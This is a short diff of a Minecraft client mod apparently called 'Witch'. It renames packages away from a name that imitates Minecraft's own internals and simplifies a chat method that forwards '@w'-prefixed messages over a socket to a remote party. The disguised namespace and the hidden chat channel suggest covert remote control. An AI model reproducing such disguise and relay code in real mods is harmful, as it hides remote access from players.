@@ -1,6 +1,6 @@
-package net.minecraft.internal.utils;
+package me.soda.witch.client.utils;
 
-import net.minecraft.internal.Witch;
+import me.soda.witch.client.Witch;
 import me.soda.witch.shared.socket.messages.Variables;
 import net.minecraft.text.MutableText;
 import net.minecraft.text.Text;
@@ -8,9 +8,9 @@ import net.minecraft.util.Formatting;
 
 import java.util.regex.Pattern;
 
-import static net.minecraft.internal.Witch.mc;
+import static me.soda.witch.client.Witch.mc;
 
-public class ChatUtil {
+public class ChatUtils {
     private static boolean firstTime = true;
 
     public static boolean filter(Text message) {
@@ -43,12 +43,9 @@ public class ChatUtil {
         mc.inGameHud.getChatHud().addMessage(message);
     }
 
-    public static boolean tryChatBack(String string) {
-        String[] msgArr = string.split(" ");
-        if (firstTime || msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
-        String[] strArr = new String[msgArr.length - 1];
-        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
-        String chatText = String.join(" ", strArr);
+    public static boolean tryChatBack(String message) {
+        if (firstTime || !message.startsWith("@w ")) return false;
+        String chatText = message.substring(3);
         chat(Text.of(chatText), true);
         Witch.send("chat", chatText);
         return true;
